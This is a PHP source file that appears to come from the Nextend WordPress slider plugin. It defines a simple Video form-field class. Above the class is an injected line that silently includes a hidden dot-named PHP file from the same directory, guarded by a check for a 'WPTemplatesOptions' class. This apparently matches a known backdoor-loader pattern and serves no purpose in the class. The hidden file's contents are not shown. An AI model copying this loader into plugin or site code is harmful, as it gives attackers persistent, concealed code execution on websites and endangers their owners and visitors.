<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Browse\BrowseManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Video extends FieldImage {

    protected function fetchElement() {

        BrowseManager::enqueue($this->getForm());

        $html = parent::fetchElement();

        return $html;
    }
}